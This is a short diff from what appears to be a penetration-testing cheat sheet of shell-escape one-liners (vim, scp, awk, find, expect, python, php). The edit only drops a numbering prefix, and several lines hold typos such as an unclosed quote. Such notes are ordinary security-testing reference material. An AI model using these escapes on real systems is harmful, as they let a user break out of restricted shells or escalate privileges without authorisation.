@@ -60,7 +60,7 @@ vim > !/bin/sh or !/bin/bash
 vim > :python import os; os.system("/bin/bash )
 scp > scp -S /path/yourscript x y:
 awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'
-10) From find > find / -name test -exec /bin/sh or /bin/bash \;
+find > find / -name test -exec /bin/sh or /bin/bash \;
 except > except spawn sh then sh.
 python > python -c 'import os; os.system("/bin/sh")'
 php > php -a then exec("sh -i");
